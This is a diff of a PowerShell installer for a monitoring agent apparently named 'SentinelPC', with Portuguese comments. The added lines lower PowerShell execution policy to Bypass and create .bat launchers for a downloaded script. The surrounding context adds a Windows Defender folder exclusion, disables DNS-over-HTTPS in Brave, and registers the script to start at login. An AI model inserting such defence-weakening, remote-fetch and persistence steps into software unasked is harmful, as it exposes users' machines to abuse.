@@ -1749,6 +1749,12 @@ Write-Host "================================================================" -F
 $d = "$env:ProgramData\\SentinelPC"
 if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
 
+# 0. Habilita politica de execucao de scripts no PowerShell
+try {
+    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force -ErrorAction SilentlyContinue
+    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContinue
+} catch {}
+
 # 1. Adiciona exclusao no Windows Defender para a pasta do agente
 try { Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue } catch {}
 
@@ -1770,10 +1776,16 @@ try {
     Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\BraveSoftware\\Brave" -Name "DnsOverHttpsMode" -Value "off" -Force -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
-# 2. Descarrega script vigia.ps1 do servidor
+# 2. Descarrega script vigia.ps1 do servidor e cria lançador .bat
 $vigiaPath = "$d\\vigia.ps1"
 Write-Host "[1/4] A descarregar script vigia.ps1 de ${serverUrl}..."
 Invoke-WebRequest -Uri "${serverUrl}/api/agent/vigia.ps1" -OutFile $vigiaPath -UseBasicParsing
+
+try {
+    $batContent = '@echo off' + [Environment]::NewLine + 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0vigia.ps1"'
+    [System.IO.File]::WriteAllText("$d\\vigia.bat", $batContent)
+    [System.IO.File]::WriteAllText("$d\\iniciar.bat", $batContent)
+} catch {}
 
 # 3. Cria atalhos nativos (.lnk) nas pastas Startup do Windows (All Users & Current User)
 Write-Host "[2/4] A configurar arranque automatico no login (Startup Shortcuts)..."
